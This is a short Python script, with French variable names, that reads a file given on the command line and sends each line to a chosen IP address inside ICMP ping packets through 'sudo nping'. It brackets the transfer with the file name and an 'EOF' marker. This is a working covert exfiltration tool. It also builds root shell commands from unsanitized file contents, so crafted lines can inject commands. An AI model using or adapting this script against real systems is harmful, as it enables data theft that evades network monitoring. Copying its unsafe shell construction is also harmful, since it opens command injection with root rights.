import sys
import os

ip_cible = str(sys.argv[1])
print(ip_cible)
chemin_fichier = str(sys.argv[2])
print(chemin_fichier)

file = open(chemin_fichier, 'r')
lines = file.readlines()
os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string '+chemin_fichier)

for index, line in enumerate(lines):
    #print("Ligne {}: {}".format(index, line.strip()))
    #line = line.encode('ascii')
    print(line)
    os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string '+ "'"+line+"'")
os.system('sudo nping --icmp -c 1 '+ip_cible+' --data-string EOF')
file.close()